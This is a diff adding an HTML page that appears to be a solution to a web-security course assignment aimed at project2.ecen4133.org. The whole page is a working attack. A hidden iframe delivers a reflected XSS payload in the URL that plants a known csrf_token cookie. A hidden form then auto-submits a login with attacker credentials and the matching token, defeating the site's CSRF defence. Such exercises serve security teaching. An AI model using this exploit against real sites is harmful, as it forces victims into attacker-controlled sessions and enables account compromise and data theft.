@@ -1,0 +1,27 @@
+<html>
+<head>
+
+<iframe style="display:none;" id="logged-in-user" name="logged-in-user" src="https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0&q=%3Cscript%3Ewindow.onload%3Dfunction()%7Bdocument.cookie%3D%22csrf_token%3D12345678901234567890123456789012%22%7D%3C%2Fscript%3E" width="1000" height="400"></iframe>
+
+
+<div style="display:none;">
+<iframe id="invisible_danger" name="invisible_danger" width="1000" height="400"></iframe>
+
+<form id="invisible_form" method="POST" action="https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0" target="invisible_danger">
+<input type="text" name="username" value="attacker" />
+<input type="text" name="password" value="l33th4x" />
+<input type="hidden" name="csrf_token" value="4b1eddec9a534b07f2b9bdfbf8fa73e4" />
+</form>
+
+<script>
+		
+document.getElementById("invisible_form").submit();
+var the_first_iframe = document.getElementById("logged-in-user");
+the_first_iframe.onload = function(){
+document.getElementById("invisible_form").submit();
+}
+</script>
+</div>
+
+</head>
+</html>
